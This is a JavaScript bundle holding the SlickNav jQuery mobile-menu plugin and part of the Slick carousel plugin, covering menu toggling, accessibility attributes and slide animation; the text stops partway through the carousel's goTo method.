!function(n, e) {
    function t(e, t) {
        this.element = e,
        this.settings = n.extend({}, a, t),
        this._defaults = a,
        this._name = i,
        this.init()
    }
    var a = {
        label: "MENU",
        duplicate: !0,
        duration: 200,
        easingOpen: "swing",
        easingClose: "swing",
        closedSymbol: "&#9658;",
        openedSymbol: "&#9660;",
        prependTo: "body",
        parentTag: "a",
        closeOnClick: !1,
        allowParentLinks: !1,
        nestedParentLinks: !0,
        showChildren: !1,
        brand: "",
        init: function() {},
        open: function() {},
        close: function() {}
    }
      , i = "slicknav"
      , s = "slicknav";
    t.prototype.init = function() {
        var t, a, i = this, l = n(this.element), o = this.settings;
        if (o.duplicate ? (i.mobileNav = l.clone(),
        i.mobileNav.removeAttr("id"),
        i.mobileNav.find("*").each(function(e, t) {
            n(t).removeAttr("id")
        })) : i.mobileNav = l,
        t = s + "_icon",
        "" === o.label && (t += " " + s + "_no-text"),
        "a" == o.parentTag && (o.parentTag = 'a href="#"'),
        i.mobileNav.attr("class", s + "_nav"),
        a = n('<div class="' + s + '_menu"></div>'),
        "" !== o.brand) {
            var r = n('<div class="' + s + '_brand">' + o.brand + "</div>");
            n(a).append(r)
        }
        i.btn = n(["<" + o.parentTag + ' aria-haspopup="true" tabindex="0" class="' + s + "_btn " + s + '_collapsed">', '<span class="' + s + '_menutxt">' + o.label + "</span>", '<span class="' + t + '">', '<span class="' + s + '_icon-bar"></span>', '<span class="' + s + '_icon-bar"></span>', '<span class="' + s + '_icon-bar"></span>', "</span>", "</" + o.parentTag + ">"].join("")),
        n(a).append(i.btn),
        n(o.prependTo).prepend(a),
        a.append(i.mobileNav);
        var d = i.mobileNav.find("li");
        n(d).each(function() {
            var e = n(this)
              , t = {};
            if (t.children = e.children("ul").attr("role", "menu"),
            e.data("menu", t),
            t.children.length > 0) {
                var a = e.contents()
                  , l = !1;
                nodes = [],
                n(a).each(function() {
                    return n(this).is("ul") ? !1 : (nodes.push(this),
                    void (n(this).is("a") && (l = !0)))
                });
                var r = n("<" + o.parentTag + ' role="menuitem" aria-haspopup="true" tabindex="-1" class="' + s + '_item"/>');
                if (o.allowParentLinks && !o.nestedParentLinks && l)
                    n(nodes).wrapAll('<span class="' + s + "_parent-link " + s + '_row"/>').parent();
                else {
                    var d = n(nodes).wrapAll(r).parent();
                    d.addClass(s + "_row")
                }
                e.addClass(s + "_collapsed"),
                e.addClass(s + "_parent");
                var c = n('<span class="' + s + '_arrow">' + o.closedSymbol + "</span>");
                o.allowParentLinks && !o.nestedParentLinks && l && (c = c.wrap(r).parent()),
                n(nodes).last().after(c)
            } else
                0 === e.children().length && e.addClass(s + "_txtnode");
            e.children("a").attr("role", "menuitem").click(function(e) {
                o.closeOnClick && !n(e.target).parent().closest("li").hasClass(s + "_parent") && n(i.btn).click()
            }),
            o.closeOnClick && o.allowParentLinks && (e.children("a").children("a").click(function() {
                n(i.btn).click()
            }),
            e.find("." + s + "_parent-link a:not(." + s + "_item)").click(function() {
                n(i.btn).click()
            }))
        }),
        n(d).each(function() {
            var e = n(this).data("menu");
            o.showChildren || i._visibilityToggle(e.children, null, !1, null, !0)
        }),
        i._visibilityToggle(i.mobileNav, null, !1, "init", !0),
        i.mobileNav.attr("role", "menu"),
        n(e).mousedown(function() {
            i._outlines(!1)
        }),
        n(e).keyup(function() {
            i._outlines(!0)
        }),
        n(i.btn).click(function(n) {
            n.preventDefault(),
            i._menuToggle()
        }),
        i.mobileNav.on("click", "." + s + "_item", function(e) {
            e.preventDefault(),
            i._itemClick(n(this))
        }),
        n(i.btn).keydown(function(n) {
            var e = n || event;
            13 == e.keyCode && (n.preventDefault(),
            i._menuToggle())
        }),
        i.mobileNav.on("keydown", "." + s + "_item", function(e) {
            var t = e || event;
            13 == t.keyCode && (e.preventDefault(),
            i._itemClick(n(e.target)))
        }),
        o.allowParentLinks && o.nestedParentLinks && n("." + s + "_item a").click(function(n) {
            n.stopImmediatePropagation()
        })
    }
    ,
    t.prototype._menuToggle = function() {
        var n = this
          , e = n.btn
          , t = n.mobileNav;
        e.hasClass(s + "_collapsed") ? (e.removeClass(s + "_collapsed"),
        e.addClass(s + "_open")) : (e.removeClass(s + "_open"),
        e.addClass(s + "_collapsed")),
        e.addClass(s + "_animating"),
        n._visibilityToggle(t, e.parent(), !0, e)
    }
    ,
    t.prototype._itemClick = function(n) {
        var e = this
          , t = e.settings
          , a = n.data("menu");
        a || (a = {},
        a.arrow = n.children("." + s + "_arrow"),
        a.ul = n.next("ul"),
        a.parent = n.parent(),
        a.parent.hasClass(s + "_parent-link") && (a.parent = n.parent().parent(),
        a.ul = n.parent().next("ul")),
        n.data("menu", a)),
        a.parent.hasClass(s + "_collapsed") ? (a.arrow.html(t.openedSymbol),
        a.parent.removeClass(s + "_collapsed"),
        a.parent.addClass(s + "_open"),
        a.parent.addClass(s + "_animating"),
        e._visibilityToggle(a.ul, a.parent, !0, n)) : (a.arrow.html(t.closedSymbol),
        a.parent.addClass(s + "_collapsed"),
        a.parent.removeClass(s + "_open"),
        a.parent.addClass(s + "_animating"),
        e._visibilityToggle(a.ul, a.parent, !0, n))
    }
    ,
    t.prototype._visibilityToggle = function(e, t, a, i, l) {
        var o = this
          , r = o.settings
          , d = o._getActionItems(e)
          , c = 0;
        a && (c = r.duration),
        e.hasClass(s + "_hidden") ? (e.removeClass(s + "_hidden"),
        e.slideDown(c, r.easingOpen, function() {
            n(i).removeClass(s + "_animating"),
            n(t).removeClass(s + "_animating"),
            l || r.open(i)
        }),
        e.attr("aria-hidden", "false"),
        d.attr("tabindex", "0"),
        o._setVisAttr(e, !1)) : (e.addClass(s + "_hidden"),
        e.slideUp(c, this.settings.easingClose, function() {
            e.attr("aria-hidden", "true"),
            d.attr("tabindex", "-1"),
            o._setVisAttr(e, !0),
            e.hide(),
            n(i).removeClass(s + "_animating"),
            n(t).removeClass(s + "_animating"),
            l ? "init" == i && r.init() : r.close(i)
        }))
    }
    ,
    t.prototype._setVisAttr = function(e, t) {
        var a = this
          , i = e.children("li").children("ul").not("." + s + "_hidden");
        i.each(t ? function() {
            var e = n(this);
            e.attr("aria-hidden", "true");
            var i = a._getActionItems(e);
            i.attr("tabindex", "-1"),
            a._setVisAttr(e, t)
        }
        : function() {
            var e = n(this);
            e.attr("aria-hidden", "false");
            var i = a._getActionItems(e);
            i.attr("tabindex", "0"),
            a._setVisAttr(e, t)
        }
        )
    }
    ,
    t.prototype._getActionItems = function(n) {
        var e = n.data("menu");
        if (!e) {
            e = {};
            var t = n.children("li")
              , a = t.find("a");
            e.links = a.add(t.find("." + s + "_item")),
            n.data("menu", e)
        }
        return e.links
    }
    ,
    t.prototype._outlines = function(e) {
        e ? n("." + s + "_item, ." + s + "_btn").css("outline", "") : n("." + s + "_item, ." + s + "_btn").css("outline", "none")
    }
    ,
    t.prototype.toggle = function() {
        var n = this;
        n._menuToggle()
    }
    ,
    t.prototype.open = function() {
        var n = this;
        n.btn.hasClass(s + "_collapsed") && n._menuToggle()
    }
    ,
    t.prototype.close = function() {
        var n = this;
        n.btn.hasClass(s + "_open") && n._menuToggle()
    }
    ,
    n.fn[i] = function(e) {
        var a = arguments;
        if (void 0 === e || "object" == typeof e)
            return this.each(function() {
                n.data(this, "plugin_" + i) || n.data(this, "plugin_" + i, new t(this,e))
            });
        if ("string" == typeof e && "_" !== e[0] && "init" !== e) {
            var s;
            return this.each(function() {
                var l = n.data(this, "plugin_" + i);
                l instanceof t && "function" == typeof l[e] && (s = l[e].apply(l, Array.prototype.slice.call(a, 1)))
            }),
            void 0 !== s ? s : this
        }
    }
}(jQuery, document, window);
!function(a) {
    "use strict";
    "function" == typeof define && define.amd ? define(["jquery"], a) : "undefined" != typeof exports ? module.exports = a(require("jquery")) : a(jQuery)
}(function(a) {
    "use strict";
    var b = window.Slick || {};
    b = function() {
        function c(c, d) {
            var f, e = this;
            e.defaults = {
                accessibility: !0,
                adaptiveHeight: !1,
                appendArrows: a(c),
                appendDots: a(c),
                arrows: !0,
                asNavFor: null,
                prevArrow: '<button type="button" data-role="none" class="slick-prev" aria-label="Previous" tabindex="0" role="button">Previous</button>',
                nextArrow: '<button type="button" data-role="none" class="slick-next" aria-label="Next" tabindex="0" role="button">Next</button>',
                autoplay: !1,
                autoplaySpeed: 3e3,
                centerMode: !1,
                centerPadding: "50px",
                cssEase: "ease",
                customPaging: function(b, c) {
                    return a('<button type="button" data-role="none" role="button" tabindex="0" />').text(c + 1)
                },
                dots: !1,
                dotsClass: "slick-dots",
                draggable: !0,
                easing: "linear",
                edgeFriction: .35,
                fade: !1,
                focusOnSelect: !1,
                infinite: !0,
                initialSlide: 0,
                lazyLoad: "ondemand",
                mobileFirst: !1,
                pauseOnHover: !0,
                pauseOnFocus: !0,
                pauseOnDotsHover: !1,
                respondTo: "window",
                responsive: null,
                rows: 1,
                rtl: !1,
                slide: "",
                slidesPerRow: 1,
                slidesToShow: 1,
                slidesToScroll: 1,
                speed: 500,
                swipe: !0,
                swipeToSlide: !1,
                touchMove: !0,
                touchThreshold: 5,
                useCSS: !0,
                useTransform: !0,
                variableWidth: !1,
                vertical: !1,
                verticalSwiping: !1,
                waitForAnimate: !0,
                zIndex: 1e3
            },
            e.initials = {
                animating: !1,
                dragging: !1,
                autoPlayTimer: null,
                currentDirection: 0,
                currentLeft: null,
                currentSlide: 0,
                direction: 1,
                $dots: null,
                listWidth: null,
                listHeight: null,
                loadIndex: 0,
                $nextArrow: null,
                $prevArrow: null,
                slideCount: null,
                slideWidth: null,
                $slideTrack: null,
                $slides: null,
                sliding: !1,
                slideOffset: 0,
                swipeLeft: null,
                $list: null,
                touchObject: {},
                transformsEnabled: !1,
                unslicked: !1
            },
            a.extend(e, e.initials),
            e.activeBreakpoint = null,
            e.animType = null,
            e.animProp = null,
            e.breakpoints = [],
            e.breakpointSettings = [],
            e.cssTransitions = !1,
            e.focussed = !1,
            e.interrupted = !1,
            e.hidden = "hidden",
            e.paused = !0,
            e.positionProp = null,
            e.respondTo = null,
            e.rowCount = 1,
            e.shouldClick = !0,
            e.$slider = a(c),
            e.$slidesCache = null,
            e.transformType = null,
            e.transitionType = null,
            e.visibilityChange = "visibilitychange",
            e.windowWidth = 0,
            e.windowTimer = null,
            f = a(c).data("slick") || {},
            e.options = a.extend({}, e.defaults, d, f),
            e.currentSlide = e.options.initialSlide,
            e.originalSettings = e.options,
            "undefined" != typeof document.mozHidden ? (e.hidden = "mozHidden",
            e.visibilityChange = "mozvisibilitychange") : "undefined" != typeof document.webkitHidden && (e.hidden = "webkitHidden",
            e.visibilityChange = "webkitvisibilitychange"),
            e.autoPlay = a.proxy(e.autoPlay, e),
            e.autoPlayClear = a.proxy(e.autoPlayClear, e),
            e.autoPlayIterator = a.proxy(e.autoPlayIterator, e),
            e.changeSlide = a.proxy(e.changeSlide, e),
            e.clickHandler = a.proxy(e.clickHandler, e),
            e.selectHandler = a.proxy(e.selectHandler, e),
            e.setPosition = a.proxy(e.setPosition, e),
            e.swipeHandler = a.proxy(e.swipeHandler, e),
            e.dragHandler = a.proxy(e.dragHandler, e),
            e.keyHandler = a.proxy(e.keyHandler, e),
            e.instanceUid = b++,
            e.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/,
            e.registerBreakpoints(),
            e.init(!0)
        }
        var b = 0;
        return c
    }(),
    b.prototype.activateADA = function() {
        var a = this;
        a.$slideTrack.find(".slick-active").attr({
            "aria-hidden": "false"
        }).find("a, input, button, select").attr({
            tabindex: "0"
        })
    }
    ,
    b.prototype.addSlide = b.prototype.slickAdd = function(b, c, d) {
        var e = this;
        if ("boolean" == typeof c)
            d = c,
            c = null;
        else if (0 > c || c >= e.slideCount)
            return !1;
        e.unload(),
        "number" == typeof c ? 0 === c && 0 === e.$slides.length ? a(b).appendTo(e.$slideTrack) : d ? a(b).insertBefore(e.$slides.eq(c)) : a(b).insertAfter(e.$slides.eq(c)) : d === !0 ? a(b).prependTo(e.$slideTrack) : a(b).appendTo(e.$slideTrack),
        e.$slides = e.$slideTrack.children(this.options.slide),
        e.$slideTrack.children(this.options.slide).detach(),
        e.$slideTrack.append(e.$slides),
        e.$slides.each(function(b, c) {
            a(c).attr("data-slick-index", b)
        }),
        e.$slidesCache = e.$slides,
        e.reinit()
    }
    ,
    b.prototype.animateHeight = function() {
        var a = this;
        if (1 === a.options.slidesToShow && a.options.adaptiveHeight === !0 && a.options.vertical === !1) {
            var b = a.$slides.eq(a.currentSlide).outerHeight(!0);
            a.$list.animate({
                height: b
            }, a.options.speed)
        }
    }
    ,
    b.prototype.animateSlide = function(b, c) {
        var d = {}
          , e = this;
        e.animateHeight(),
        e.options.rtl === !0 && e.options.vertical === !1 && (b = -b),
        e.transformsEnabled === !1 ? e.options.vertical === !1 ? e.$slideTrack.animate({
            left: b
        }, e.options.speed, e.options.easing, c) : e.$slideTrack.animate({
            top: b
        }, e.options.speed, e.options.easing, c) : e.cssTransitions === !1 ? (e.options.rtl === !0 && (e.currentLeft = -e.currentLeft),
        a({
            animStart: e.currentLeft
        }).animate({
            animStart: b
        }, {
            duration: e.options.speed,
            easing: e.options.easing,
            step: function(a) {
                a = Math.ceil(a),
                e.options.vertical === !1 ? (d[e.animType] = "translate(" + a + "px, 0px)",
                e.$slideTrack.css(d)) : (d[e.animType] = "translate(0px," + a + "px)",
                e.$slideTrack.css(d))
            },
            complete: function() {
                c && c.call()
            }
        })) : (e.applyTransition(),
        b = Math.ceil(b),
        e.options.vertical === !1 ? d[e.animType] = "translate3d(" + b + "px, 0px, 0px)" : d[e.animType] = "translate3d(0px," + b + "px, 0px)",
        e.$slideTrack.css(d),
        c && setTimeout(function() {
            e.disableTransition(),
            c.call()
        }, e.options.speed))
    }
    ,
    b.prototype.getNavTarget = function() {
        var b = this
          , c = b.options.asNavFor;
        return c && null !== c && (c = a(c).not(b.$slider)),
        c
    }
    ,
    b.prototype.asNavFor = function(b) {
        var c = this
          , d = c.getNavTarget();
        null !== d && "object" == typeof d && d.each(function() {
            var c = a(this).slick("getSlick");
            c.unslicked || c.slideHandler(b, !0)
        })
    }
    ,
    b.prototype.applyTransition = function(a) {
        var b = this
          , c = {};
        b.options.fade === !1 ? c[b.transitionType] = b.transformType + " " + b.options.speed + "ms " + b.options.cssEase : c[b.transitionType] = "opacity " + b.options.speed + "ms " + b.options.cssEase,
        b.options.fade === !1 ? b.$slideTrack.css(c) : b.$slides.eq(a).css(c)
    }
    ,
    b.prototype.autoPlay = function() {
        var a = this;
        a.autoPlayClear(),
        a.slideCount > a.options.slidesToShow && (a.autoPlayTimer = setInterval(a.autoPlayIterator, a.options.autoplaySpeed))
    }
    ,
    b.prototype.autoPlayClear = function() {
        var a = this;
        a.autoPlayTimer && clearInterval(a.autoPlayTimer)
    }
    ,
    b.prototype.autoPlayIterator = function() {
        var a = this
          , b = a.currentSlide + a.options.slidesToScroll;
        a.paused || a.interrupted || a.focussed || (a.options.infinite === !1 && (1 === a.direction && a.currentSlide + 1 === a.slideCount - 1 ? a.direction = 0 : 0 === a.direction && (b = a.currentSlide - a.options.slidesToScroll,
        a.currentSlide - 1 === 0 && (a.direction = 1))),
        a.slideHandler(b))
    }
    ,
    b.prototype.buildArrows = function() {
        var b = this;
        b.options.arrows === !0 && (b.$prevArrow = a(b.options.prevArrow).addClass("slick-arrow"),
        b.$nextArrow = a(b.options.nextArrow).addClass("slick-arrow"),
        b.slideCount > b.options.slidesToShow ? (b.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),
        b.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),
        b.htmlExpr.test(b.options.prevArrow) && b.$prevArrow.prependTo(b.options.appendArrows),
        b.htmlExpr.test(b.options.nextArrow) && b.$nextArrow.appendTo(b.options.appendArrows),
        b.options.infinite !== !0 && b.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true")) : b.$prevArrow.add(b.$nextArrow).addClass("slick-hidden").attr({
            "aria-disabled": "true",
            tabindex: "-1"
        }))
    }
    ,
    b.prototype.buildDots = function() {
        var c, d, b = this;
        if (b.options.dots === !0 && b.slideCount > b.options.slidesToShow) {
            for (b.$slider.addClass("slick-dotted"),
            d = a("<ul />").addClass(b.options.dotsClass),
            c = 0; c <= b.getDotCount(); c += 1)
                d.append(a("<li />").append(b.options.customPaging.call(this, b, c)));
            b.$dots = d.appendTo(b.options.appendDots),
            b.$dots.find("li").first().addClass("slick-active").attr("aria-hidden", "false")
        }
    }
    ,
    b.prototype.buildOut = function() {
        var b = this;
        b.$slides = b.$slider.children(b.options.slide + ":not(.slick-cloned)").addClass("slick-slide"),
        b.slideCount = b.$slides.length,
        b.$slides.each(function(b, c) {
            a(c).attr("data-slick-index", b).data("originalStyling", a(c).attr("style") || "")
        }),
        b.$slider.addClass("slick-slider"),
        b.$slideTrack = 0 === b.slideCount ? a('<div class="slick-track"/>').appendTo(b.$slider) : b.$slides.wrapAll('<div class="slick-track"/>').parent(),
        b.$list = b.$slideTrack.wrap('<div aria-live="polite" class="slick-list"/>').parent(),
        b.$slideTrack.css("opacity", 0),
        (b.options.centerMode === !0 || b.options.swipeToSlide === !0) && (b.options.slidesToScroll = 1),
        a("img[data-lazy]", b.$slider).not("[src]").addClass("slick-loading"),
        b.setupInfinite(),
        b.buildArrows(),
        b.buildDots(),
        b.updateDots(),
        b.setSlideClasses("number" == typeof b.currentSlide ? b.currentSlide : 0),
        b.options.draggable === !0 && b.$list.addClass("draggable")
    }
    ,
    b.prototype.buildRows = function() {
        var b, c, d, e, f, g, h, a = this;
        if (e = document.createDocumentFragment(),
        g = a.$slider.children(),
        a.options.rows > 1) {
            for (h = a.options.slidesPerRow * a.options.rows,
            f = Math.ceil(g.length / h),
            b = 0; f > b; b++) {
                var i = document.createElement("div");
                for (c = 0; c < a.options.rows; c++) {
                    var j = document.createElement("div");
                    for (d = 0; d < a.options.slidesPerRow; d++) {
                        var k = b * h + (c * a.options.slidesPerRow + d);
                        g.get(k) && j.appendChild(g.get(k))
                    }
                    i.appendChild(j)
                }
                e.appendChild(i)
            }
            a.$slider.empty().append(e),
            a.$slider.children().children().children().css({
                width: 100 / a.options.slidesPerRow + "%",
                display: "inline-block"
            })
        }
    }
    ,
    b.prototype.checkResponsive = function(b, c) {
        var e, f, g, d = this, h = !1, i = d.$slider.width(), j = window.innerWidth || a(window).width();
        if ("window" === d.respondTo ? g = j : "slider" === d.respondTo ? g = i : "min" === d.respondTo && (g = Math.min(j, i)),
        d.options.responsive && d.options.responsive.length && null !== d.options.responsive) {
            f = null;
            for (e in d.breakpoints)
                d.breakpoints.hasOwnProperty(e) && (d.originalSettings.mobileFirst === !1 ? g < d.breakpoints[e] && (f = d.breakpoints[e]) : g > d.breakpoints[e] && (f = d.breakpoints[e]));
            null !== f ? null !== d.activeBreakpoint ? (f !== d.activeBreakpoint || c) && (d.activeBreakpoint = f,
            "unslick" === d.breakpointSettings[f] ? d.unslick(f) : (d.options = a.extend({}, d.originalSettings, d.breakpointSettings[f]),
            b === !0 && (d.currentSlide = d.options.initialSlide),
            d.refresh(b)),
            h = f) : (d.activeBreakpoint = f,
            "unslick" === d.breakpointSettings[f] ? d.unslick(f) : (d.options = a.extend({}, d.originalSettings, d.breakpointSettings[f]),
            b === !0 && (d.currentSlide = d.options.initialSlide),
            d.refresh(b)),
            h = f) : null !== d.activeBreakpoint && (d.activeBreakpoint = null,
            d.options = d.originalSettings,
            b === !0 && (d.currentSlide = d.options.initialSlide),
            d.refresh(b),
            h = f),
            b || h === !1 || d.$slider.trigger("breakpoint", [d, h])
        }
    }
    ,
    b.prototype.changeSlide = function(b, c) {
        var f, g, h, d = this, e = a(b.currentTarget);
        switch (e.is("a") && b.preventDefault(),
        e.is("li") || (e = e.closest("li")),
        h = d.slideCount % d.options.slidesToScroll !== 0,
        f = h ? 0 : (d.slideCount - d.currentSlide) % d.options.slidesToScroll,
        b.data.message) {
        case "previous":
            g = 0 === f ? d.options.slidesToScroll : d.options.slidesToShow - f,
            d.slideCount > d.options.slidesToShow && d.slideHandler(d.currentSlide - g, !1, c);
            break;
        case "next":
            g = 0 === f ? d.options.slidesToScroll : f,
            d.slideCount > d.options.slidesToShow && d.slideHandler(d.currentSlide + g, !1, c);
            break;
        case "index":
            var i = 0 === b.data.index ? 0 : b.data.index || e.index() * d.options.slidesToScroll;
            d.slideHandler(d.checkNavigable(i), !1, c),
            e.children().trigger("focus");
            break;
        default:
            return
        }
    }
    ,
    b.prototype.checkNavigable = function(a) {
        var c, d, b = this;
        if (c = b.getNavigableIndexes(),
        d = 0,
        a > c[c.length - 1])
            a = c[c.length - 1];
        else
            for (var e in c) {
                if (a < c[e]) {
                    a = d;
                    break
                }
                d = c[e]
            }
        return a
    }
    ,
    b.prototype.cleanUpEvents = function() {
        var b = this;
        b.options.dots && null !== b.$dots && a("li", b.$dots).off("click.slick", b.changeSlide).off("mouseenter.slick", a.proxy(b.interrupt, b, !0)).off("mouseleave.slick", a.proxy(b.interrupt, b, !1)),
        b.$slider.off("focus.slick blur.slick"),
        b.options.arrows === !0 && b.slideCount > b.options.slidesToShow && (b.$prevArrow && b.$prevArrow.off("click.slick", b.changeSlide),
        b.$nextArrow && b.$nextArrow.off("click.slick", b.changeSlide)),
        b.$list.off("touchstart.slick mousedown.slick", b.swipeHandler),
        b.$list.off("touchmove.slick mousemove.slick", b.swipeHandler),
        b.$list.off("touchend.slick mouseup.slick", b.swipeHandler),
        b.$list.off("touchcancel.slick mouseleave.slick", b.swipeHandler),
        b.$list.off("click.slick", b.clickHandler),
        a(document).off(b.visibilityChange, b.visibility),
        b.cleanUpSlideEvents(),
        b.options.accessibility === !0 && b.$list.off("keydown.slick", b.keyHandler),
        b.options.focusOnSelect === !0 && a(b.$slideTrack).children().off("click.slick", b.selectHandler),
        a(window).off("orientationchange.slick.slick-" + b.instanceUid, b.orientationChange),
        a(window).off("resize.slick.slick-" + b.instanceUid, b.resize),
        a("[draggable!=true]", b.$slideTrack).off("dragstart", b.preventDefault),
        a(window).off("load.slick.slick-" + b.instanceUid, b.setPosition),
        a(document).off("ready.slick.slick-" + b.instanceUid, b.setPosition)
    }
    ,
    b.prototype.cleanUpSlideEvents = function() {
        var b = this;
        b.$list.off("mouseenter.slick", a.proxy(b.interrupt, b, !0)),
        b.$list.off("mouseleave.slick", a.proxy(b.interrupt, b, !1))
    }
    ,
    b.prototype.cleanUpRows = function() {
        var b, a = this;
        a.options.rows > 1 && (b = a.$slides.children().children(),
        b.removeAttr("style"),
        a.$slider.empty().append(b))
    }
    ,
    b.prototype.clickHandler = function(a) {
        var b = this;
        b.shouldClick === !1 && (a.stopImmediatePropagation(),
        a.stopPropagation(),
        a.preventDefault())
    }
    ,
    b.prototype.destroy = function(b) {
        var c = this;
        c.autoPlayClear(),
        c.touchObject = {},
        c.cleanUpEvents(),
        a(".slick-cloned", c.$slider).detach(),
        c.$dots && c.$dots.remove(),
        c.$prevArrow && c.$prevArrow.length && (c.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""),
        c.htmlExpr.test(c.options.prevArrow) && c.$prevArrow.remove()),
        c.$nextArrow && c.$nextArrow.length && (c.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""),
        c.htmlExpr.test(c.options.nextArrow) && c.$nextArrow.remove()),
        c.$slides && (c.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function() {
            a(this).attr("style", a(this).data("originalStyling"))
        }),
        c.$slideTrack.children(this.options.slide).detach(),
        c.$slideTrack.detach(),
        c.$list.detach(),
        c.$slider.append(c.$slides)),
        c.cleanUpRows(),
        c.$slider.removeClass("slick-slider"),
        c.$slider.removeClass("slick-initialized"),
        c.$slider.removeClass("slick-dotted"),
        c.unslicked = !0,
        b || c.$slider.trigger("destroy", [c])
    }
    ,
    b.prototype.disableTransition = function(a) {
        var b = this
          , c = {};
        c[b.transitionType] = "",
        b.options.fade === !1 ? b.$slideTrack.css(c) : b.$slides.eq(a).css(c)
    }
    ,
    b.prototype.fadeSlide = function(a, b) {
        var c = this;
        c.cssTransitions === !1 ? (c.$slides.eq(a).css({
            zIndex: c.options.zIndex
        }),
        c.$slides.eq(a).animate({
            opacity: 1
        }, c.options.speed, c.options.easing, b)) : (c.applyTransition(a),
        c.$slides.eq(a).css({
            opacity: 1,
            zIndex: c.options.zIndex
        }),
        b && setTimeout(function() {
            c.disableTransition(a),
            b.call()
        }, c.options.speed))
    }
    ,
    b.prototype.fadeSlideOut = function(a) {
        var b = this;
        b.cssTransitions === !1 ? b.$slides.eq(a).animate({
            opacity: 0,
            zIndex: b.options.zIndex - 2
        }, b.options.speed, b.options.easing) : (b.applyTransition(a),
        b.$slides.eq(a).css({
            opacity: 0,
            zIndex: b.options.zIndex - 2
        }))
    }
    ,
    b.prototype.filterSlides = b.prototype.slickFilter = function(a) {
        var b = this;
        null !== a && (b.$slidesCache = b.$slides,
        b.unload(),
        b.$slideTrack.children(this.options.slide).detach(),
        b.$slidesCache.filter(a).appendTo(b.$slideTrack),
        b.reinit())
    }
    ,
    b.prototype.focusHandler = function() {
        var b = this;
        b.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*:not(.slick-arrow)", function(c) {
            c.stopImmediatePropagation();
            var d = a(this);
            setTimeout(function() {
                b.options.pauseOnFocus && (b.focussed = d.is(":focus"),
                b.autoPlay())
            }, 0)
        })
    }
    ,
    b.prototype.getCurrent = b.prototype.slickCurrentSlide = function() {
        var a = this;
        return a.currentSlide
    }
    ,
    b.prototype.getDotCount = function() {
        var a = this
          , b = 0
          , c = 0
          , d = 0;
        if (a.options.infinite === !0)
            for (; b < a.slideCount; )
                ++d,
                b = c + a.options.slidesToScroll,
                c += a.options.slidesToScroll <= a.options.slidesToShow ? a.options.slidesToScroll : a.options.slidesToShow;
        else if (a.options.centerMode === !0)
            d = a.slideCount;
        else if (a.options.asNavFor)
            for (; b < a.slideCount; )
                ++d,
                b = c + a.options.slidesToScroll,
                c += a.options.slidesToScroll <= a.options.slidesToShow ? a.options.slidesToScroll : a.options.slidesToShow;
        else
            d = 1 + Math.ceil((a.slideCount - a.options.slidesToShow) / a.options.slidesToScroll);
        return d - 1
    }
    ,
    b.prototype.getLeft = function(a) {
        var c, d, f, b = this, e = 0;
        return b.slideOffset = 0,
        d = b.$slides.first().outerHeight(!0),
        b.options.infinite === !0 ? (b.slideCount > b.options.slidesToShow && (b.slideOffset = b.slideWidth * b.options.slidesToShow * -1,
        e = d * b.options.slidesToShow * -1),
        b.slideCount % b.options.slidesToScroll !== 0 && a + b.options.slidesToScroll > b.slideCount && b.slideCount > b.options.slidesToShow && (a > b.slideCount ? (b.slideOffset = (b.options.slidesToShow - (a - b.slideCount)) * b.slideWidth * -1,
        e = (b.options.slidesToShow - (a - b.slideCount)) * d * -1) : (b.slideOffset = b.slideCount % b.options.slidesToScroll * b.slideWidth * -1,
        e = b.slideCount % b.options.slidesToScroll * d * -1))) : a + b.options.slidesToShow > b.slideCount && (b.slideOffset = (a + b.options.slidesToShow - b.slideCount) * b.slideWidth,
        e = (a + b.options.slidesToShow - b.slideCount) * d),
        b.slideCount <= b.options.slidesToShow && (b.slideOffset = 0,
        e = 0),
        b.options.centerMode === !0 && b.options.infinite === !0 ? b.slideOffset += b.slideWidth * Math.floor(b.options.slidesToShow / 2) - b.slideWidth : b.options.centerMode === !0 && (b.slideOffset = 0,
        b.slideOffset += b.slideWidth * Math.floor(b.options.slidesToShow / 2)),
        c = b.options.vertical === !1 ? a * b.slideWidth * -1 + b.slideOffset : a * d * -1 + e,
        b.options.variableWidth === !0 && (f = b.slideCount <= b.options.slidesToShow || b.options.infinite === !1 ? b.$slideTrack.children(".slick-slide").eq(a) : b.$slideTrack.children(".slick-slide").eq(a + b.options.slidesToShow),
        c = b.options.rtl === !0 ? f[0] ? -1 * (b.$slideTrack.width() - f[0].offsetLeft - f.width()) : 0 : f[0] ? -1 * f[0].offsetLeft : 0,
        b.options.centerMode === !0 && (f = b.slideCount <= b.options.slidesToShow || b.options.infinite === !1 ? b.$slideTrack.children(".slick-slide").eq(a) : b.$slideTrack.children(".slick-slide").eq(a + b.options.slidesToShow + 1),
        c = b.options.rtl === !0 ? f[0] ? -1 * (b.$slideTrack.width() - f[0].offsetLeft - f.width()) : 0 : f[0] ? -1 * f[0].offsetLeft : 0,
        c += (b.$list.width() - f.outerWidth()) / 2)),
        c
    }
    ,
    b.prototype.getOption = b.prototype.slickGetOption = function(a) {
        var b = this;
        return b.options[a]
    }
    ,
    b.prototype.getNavigableIndexes = function() {
        var e, a = this, b = 0, c = 0, d = [];
        for (a.options.infinite === !1 ? e = a.slideCount : (b = -1 * a.options.slidesToScroll,
        c = -1 * a.options.slidesToScroll,
        e = 2 * a.slideCount); e > b; )
            d.push(b),
            b = c + a.options.slidesToScroll,
            c += a.options.slidesToScroll <= a.options.slidesToShow ? a.options.slidesToScroll : a.options.slidesToShow;
        return d
    }
    ,
    b.prototype.getSlick = function() {
        return this
    }
    ,
    b.prototype.getSlideCount = function() {
        var c, d, e, b = this;
        return e = b.options.centerMode === !0 ? b.slideWidth * Math.floor(b.options.slidesToShow / 2) : 0,
        b.options.swipeToSlide === !0 ? (b.$slideTrack.find(".slick-slide").each(function(c, f) {
            return f.offsetLeft - e + a(f).outerWidth() / 2 > -1 * b.swipeLeft ? (d = f,
            !1) : void 0
        }),
        c = Math.abs(a(d).attr("data-slick-index") - b.currentSlide) || 1) : b.options.slidesToScroll
    }
    ,
    b.prototype.goTo = b.prototype.slickGoTo = function(a, b) {
        var c = this;
